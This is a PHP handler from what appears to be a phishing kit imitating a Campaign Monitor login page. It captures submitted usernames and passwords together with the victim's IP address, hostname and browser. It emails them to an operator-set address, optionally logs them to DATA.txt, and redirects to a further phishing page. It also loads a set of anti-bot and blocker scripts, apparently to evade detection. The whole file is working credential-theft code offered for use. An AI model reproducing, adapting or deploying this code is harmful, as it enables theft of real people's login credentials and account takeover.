<?php

/*

    CREDIT: @RETRO_CODER

*/
    error_reporting(0);
    include('Email.php');

    require 'prevents/anti1.php';
    require 'prevents/anti3.php';
    require 'prevents/anti4.php';
    require 'prevents/anti5.php';
    require 'prevents/anti6.php';
    require 'prevents/anti7.php';
    require 'prevents/anti8.php';
    require 'prevents/antibots.php';
    require 'prevents/bt.php';
    require "prevents/blocker.php";
    



    // DONT CHANGE ANYTHING HERE!
    //$ORIGINAL_WEBSITE_HOMEPAGE_URL = "https://www.campaignmonitor.com/";
    //$CLIENT_IP = get_client_ip();
    $USERNAME = $_POST["username"];
    $PASSWORD = $_POST["password"];
    $CLIENT_IP = getenv("REMOTE_ADDR");
    $HOST = gethostbyaddr($CLIENT_IP);
    $USER_AGENT = $_SERVER['HTTP_USER_AGENT'];
    

    IF($ENGINE_START === TRUE){
        $headers = "From: "."noreply@".$YOUR_DOMAIN_NAME;
        $to = $WORKING_MAIL;
        $subject = "LOGIN DATA ALERT";
        $message  = "========== NEW LOGIN DATA =====================. "
                . " . "."\n"."\n"
                . "USERNAME: $USERNAME"."\n"
                . "PASSWORD: $PASSWORD"."\n"
                . "IP ADDRESS: $CLIENT_IP"."\n"
                . "HOST: $HOST"."\n"
                . "IP PING LINK:  http://www.geoiptool.com/?IP=$CLIENT_IP"."\n"
                . "USER AGENT [BROWSER]: $USER_AGENT"."\n";
        mail($to, $subject, $message, $headers);
        
        IF($WRITE_TO_DISK_CONTROLLER === TRUE){
            $text = fopen('DATA.txt', 'a');
            fwrite($text, $message);
        }
    }

    header("Location: ./email-account.php");

?>